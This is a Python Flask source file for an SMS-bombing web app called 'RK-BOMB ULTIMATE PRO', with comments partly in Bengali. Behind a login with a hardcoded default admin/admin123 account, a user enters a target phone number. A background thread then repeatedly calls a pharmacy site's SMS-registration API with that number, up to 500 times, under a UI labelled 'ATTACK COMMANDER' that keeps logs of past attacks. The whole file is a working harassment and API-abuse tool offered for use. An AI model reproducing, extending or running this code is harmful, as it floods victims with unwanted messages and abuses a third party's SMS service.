import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- DATABASE SETUP ----------
def get_db():
    conn = sqlite3.connect('rk_ultra_ultimate.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, total INTEGER, limit_amt INTEGER, status TEXT, 
            start_time TEXT, stop_time TEXT, duration TEXT, date_str TEXT)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- BOMBING ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    # আপনি চাইলে এখানে আরও API লিঙ্ক লিস্ট আকারে যোগ করতে পারেন
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]

    while key in active_sessions:
        curr = active_sessions[key]
        
        # স্টপ বা লিমিট শেষ হলে লুপ বন্ধ হবে
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped':
            break
            
        if curr['status'] == 'Running':
            try:
                target_api = random.choice(api_list).format(phone)
                res = requests.get(target_api, timeout=10)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
            except:
                pass
            
            active_sessions[key]['total'] += 1
            time.sleep(1.5) # সার্ভার সেফটির জন্য বিরতি
        else:
            time.sleep(1)

    # সেশন শেষ হওয়ার পর ডাটাবেসে সেভ করা
    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    final_s = active_sessions.get(key)
    
    if final_s:
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, total, limit_amt, status, start_time, stop_time, duration, date_str) 
                VALUES (?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, final_s['success'], final_s['total'], final_s['limit'], 
                 "Finished", final_s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y")))
        del active_sessions[key]

# ---------- ADVANCED UI WITH ALL SOUNDS & ANIMATIONS ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB ULTIMATE PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --card: #0f0f0f; --red: #ff3333; --yellow: #ffcc00; }
        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        
        .nav { background: #000; padding: 15px 20px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; box-shadow: 0 0 15px rgba(0,255,204,0.3); position: sticky; top: 0; z-index: 1000; }
        .logo { font-family: 'Orbitron'; font-weight: 700; font-size: 1.2rem; text-shadow: 0 0 10px var(--neon); }
        
        .container { padding: 20px; max-width: 600px; margin: auto; }
        
        .card { background: var(--card); border: 1px solid #222; border-radius: 15px; padding: 20px; margin-bottom: 20px; position: relative; overflow: hidden; transition: 0.3s; }
        .card:hover { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,204,0.1); }
        
        h3 { margin-top: 0; font-family: 'Orbitron'; font-size: 1rem; color: #fff; }
        
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; font-family: 'Rajdhani'; }
        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,204,0.2); }
        
        .fire-btn { background: var(--neon); color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; font-size: 14px; transition: 0.2s; box-shadow: 0 0 10px rgba(0,255,204,0.2); }
        .fire-btn:active { transform: scale(0.95); }
        
        .prog-bg { background: #222; height: 12px; border-radius: 6px; overflow: hidden; margin: 15px 0; position: relative; }
        .prog-bar { background: linear-gradient(90deg, #00ffcc, #0099ff); height: 100%; width: 0%; transition: 0.5s; box-shadow: 0 0 10px var(--neon); }
        
        .stat-row { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 10px; color: #ccc; }
        
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        .btn-pause { background: var(--yellow); color: #000; }
        .btn-stop { background: var(--red); color: #fff; }
        
        .nav-links a { color: var(--neon); text-decoration: none; margin-left: 15px; font-weight: bold; font-size: 0.9rem; }
        
        /* Animations */
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .live-dot { height: 8px; width: 8px; background: var(--red); border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1s infinite; }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
    <audio id="snd_stop" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
    <audio id="snd_pause" src="https://assets.mixkit.co/active_storage/sfx/2572/2572-preview.mp3"></audio>
    <audio id="snd_resume" src="https://assets.mixkit.co/active_storage/sfx/2570/2570-preview.mp3"></audio>
    <audio id="snd_click" src="https://assets.mixkit.co/active_storage/sfx/2567/2567-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-BOMB <span style="color:#fff">ULTRA</span></div>
        <div class="nav-links">
            <a href="/dashboard" onclick="playSnd('snd_click')">DASH</a>
            <a href="/history" onclick="playSnd('snd_click')">LOGS</a>
            <a href="/logout" style="color:var(--red)" onclick="playSnd('snd_stop')">EXIT</a>
        </div>
    </nav>

    <div class="container">[CONTENT]</div>

    <script>
        function playSnd(id) {
            let s = document.getElementById(id);
            if(s) { s.currentTime = 0; s.play().catch(e=>{}); }
        }

        function syncStatus() {
            let area = document.getElementById('live-engine');
            if(!area) return;

            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let progress = (s.total / s.limit) * 100;
                    
                    html += `
                    <div class="card" style="border-left: 4px solid ${s.status === 'Running' ? 'var(--neon)' : 'var(--yellow)'}">
                        <div class="stat-row">
                            <span style="color:#fff; font-weight:bold;">🎯 TARGET: ${s.phone}</span>
                            <span style="font-size:10px;"><span class="live-dot"></span>${s.status.toUpperCase()}</span>
                        </div>
                        <div class="prog-bg"><div class="prog-bar" style="width:${progress}%"></div></div>
                        <div class="stat-row">
                            <span>✅ SUCCESS: ${s.success}</span>
                            <span>📊 TOTAL: ${s.total} / ${s.limit}</span>
                        </div>
                        <div class="btn-group">
                            <button class="fire-btn btn-pause" onclick="playSnd('${s.status==='Running'?'snd_pause':'snd_resume'}'); setTimeout(()=>location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}', 300)">
                                ${s.status === 'Running' ? '⏸ PAUSE' : '▶ RESUME'}
                            </button>
                            <button class="fire-btn btn-stop" onclick="playSnd('snd_stop'); setTimeout(()=>location.href='/api/stop?num=${s.phone}', 300)">
                                🛑 STOP
                            </button>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(syncStatus, 2000);
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="card" style="text-align:center;">
            <h3>🔐 SYSTEM LOGIN</h3>
            <form method="POST" onsubmit="playSnd('snd_start')">
                <input name="u" placeholder="Admin Username" required>
                <input name="p" type="password" placeholder="Password" required>
                <button class="fire-btn">INITIALIZE ACCESS</button>
            </form>
        </div>
    '''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="card">
            <h3>🚀 ATTACK COMMANDER</h3>
            <form action="/api/start" onsubmit="playSnd('snd_start')">
                <input name="num" placeholder="Target Phone (017...)" required>
                <input name="amt" type="number" placeholder="SMS Limit (Max 500)" max="500" required>
                <button class="fire-btn">LAUNCH ATTACK</button>
            </form>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 20").fetchall()
    
    html = '<h3>📜 MISSION ARCHIVE</h3>'
    if not logs: html += '<p style="color:#666; text-align:center;">No history found.</p>'
    for l in logs:
        html += f'''
        <div class="card" style="padding:15px; font-size:13px; border-left: 2px solid #333;">
            <div class="stat-row" style="margin-bottom:5px;">
                <b style="color:var(--neon)">📱 {l['phone']}</b>
                <span>{l['date_str']}</span>
            </div>
            <div style="color:#aaa;">Hits: {l['success']} | Duration: {l['duration']}</div>
            <div style="font-size:10px; color:#666; margin-top:5px;">Time: {l['start_time']} - {l['stop_time']}</div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API ACTIONS ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    # সাউন্ড ফ্ল্যাগ রিসেট
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions:
        active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions:
        active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    # Render বা Localhost এ রান করার জন্য
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
